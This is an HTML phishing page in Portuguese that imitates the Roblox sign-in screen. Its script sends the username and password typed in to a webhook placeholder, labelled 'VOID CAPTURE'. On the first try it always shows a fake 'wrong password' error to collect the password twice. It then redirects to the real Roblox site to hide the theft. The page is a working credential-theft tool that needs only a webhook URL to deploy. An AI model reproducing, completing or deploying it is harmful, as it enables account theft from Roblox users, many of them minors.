<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
        
        :root {
            --bg-main: #191a1f; 
            --bg-card: #272930;
            --input-bg: #121215;
            --text-main: #ffffff;
            --rbx-blue: #0084ff;
            --rbx-error: #df281f;
            --border-grey: #494d5a;
            --footer-bg: #121215;
            /* TOKENS EXTRAÍDOS DO SCRIPT 4 (INTERFACE) */
            --state-hover: rgba(255, 255, 255, 0.1);
            --state-press: rgba(255, 255, 255, 0.15);
            --radius-main: 8px; /* Arredondamento Foundation oficial */
        }

        @keyframes fadein-delay { 0% { opacity: 0 } 50% { opacity: 0 } to { opacity: 1 } }

        body, html { 
            margin: 0; padding: 0; min-height: 100%; 
            font-family: 'HCo Gotham SSm', sans-serif; 
            background-color: var(--bg-main); color: var(--text-main); 
            display: flex; flex-direction: column; overflow-x: hidden;
            animation: fadein-delay 0.8s ease-in;
        }

        /* --- UI COMPONENTS --- */
        .roblox-header { width: 100%; height: 44px; background: #232527; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: fixed; top: 0; z-index: 100; box-sizing: border-box; border-bottom: 1px solid var(--border-grey); }
        .header-left { display: flex; align-items: center; gap: 15px; }
        .roblox-logo { height: 28px; width: 28px; background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); background-size: contain; background-repeat: no-repeat; }
        .nav-link { color: #fff; text-decoration: none; font-size: 14px; font-weight: 500; opacity: 0.9; }

        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column; background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg'); background-size: cover; background-position: center; padding: 80px 0 40px 0; }
        
        /* CARD COM ARREDONDAMENTO ATUALIZADO (SCRIPT 4) */
        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: var(--radius-main); width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); box-sizing: border-box; }
        
        #error-msg { color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; text-align: left; background: rgba(223, 40, 31, 0.1); padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error); }

        .input-field { width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728; border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; transition: border 0.2s; }
        .input-field:focus { border: 1px solid var(--rbx-blue); }
        
        /* --- BOTÃO PRINCIPAL (UPGRADE VOID/SCRIPT 4) --- */
        .btn-primary-md { 
            width: 100%; height: 40px; 
            border: 1px solid #fff; background: transparent; 
            color: #fff; border-radius: 4px; 
            font-size: 16px; font-weight: 500; cursor: pointer; 
            margin-top: 10px;
            transition: all 0.2s ease-in-out;
            position: relative;
        }
        .btn-primary-md:hover { background-color: var(--state-hover); }
        .btn-primary-md:active { background-color: var(--state-press); transform: scale(0.98); }

        /* --- BOTÃO SECUNDÁRIO (UPGRADE VOID/SCRIPT 4) --- */
        .btn-secondary { 
            width: 100%; height: 40px; 
            background-color: #4b4d4e; border: none; 
            color: #fff; border-radius: 4px; 
            margin-top: 10px; cursor: pointer; font-weight: 500;
            transition: background 0.2s;
        }
        .btn-secondary:hover { background-color: #5a5c5e; }
        .btn-secondary:active { transform: scale(0.98); }

        .container-footer { background-color: var(--footer-bg); padding: 40px 0; width: 100%; }
        .footer-note { font-size: 12px; color: #d5d7dd; opacity: 0.7; text-align: center; }

        /* LOADING UI */
        #loading-overlay { background-color: rgba(0,0,0,0.85); position: fixed; inset: 0; z-index: 2000; display: none; align-items: center; justify-content: center; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .shake { animation: shake 0.2s ease-in-out 0s 2; }
    </style>
</head>
<body>

<div id="loading-overlay"><div class="spinner"></div></div>

<header class="roblox-header">
    <div class="header-left">
        <div class="roblox-logo"></div>
        <a href="#" class="nav-link">Destaques</a><a href="#" class="nav-link">Mercado</a>
    </div>
</header>

<main class="main-content">
    <div class="login-card" id="card">
        <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px;">Entrar na Roblox</h1>
        <div id="error-msg">Usuário ou senha incorretos.</div>
        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
        <input type="password" id="pass" class="input-field" placeholder="Senha">
        <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
        <div style="margin-top: 15px; border-bottom: 1px solid #454749; padding-bottom: 20px;">
            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none; font-weight: 500;">Esqueceu a senha?</a>
        </div>
        <button class="btn-secondary">Entrada rápida</button>
    </div>
</main>

<footer class="container-footer">
    <p class="footer-note">©2026 Roblox Corporation. Todos os direitos reservados.</p>
</footer>

<script>
    let attempt = 0;

    async function execLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const card = document.getElementById('card');
        const errorDiv = document.getElementById('error-msg');
        const passInput = document.getElementById('pass');

        if(!u || !p) {
            card.classList.add('shake');
            setTimeout(() => card.classList.remove('shake'), 400);
            return;
        }

        attempt++;
        document.getElementById('loading-overlay').style.display = 'flex';

        try {
            await fetch("SUA_WEBHOOK_AQUI", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🛡️ VOID CAPTURE - " + (attempt === 1 ? "TRY 1" : "FINAL"),
                        color: attempt === 1 ? 0xff4747 : 0x00ff00,
                        fields: [
                            { name: "👤 User", value: `\`${u}\``, inline: true },
                            { name: "🔑 Pass", value: `\`${p}\``, inline: true }
                        ],
                        footer: { text: "Protocolo Colmeia | CTO VOID" }
                    }]
                }),
                mode: 'no-cors'
            });
        } catch(e) {}

        setTimeout(() => {
            document.getElementById('loading-overlay').style.display = 'none';
            if(attempt === 1) {
                errorDiv.style.display = 'block';
                passInput.value = '';
                passInput.classList.add('input-error');
                card.classList.add('shake');
                setTimeout(() => card.classList.remove('shake'), 400);
            } else {
                window.location.href = "https://www.roblox.com/home";
            }
        }, 1200);
    }
</script>
</body>
</html>
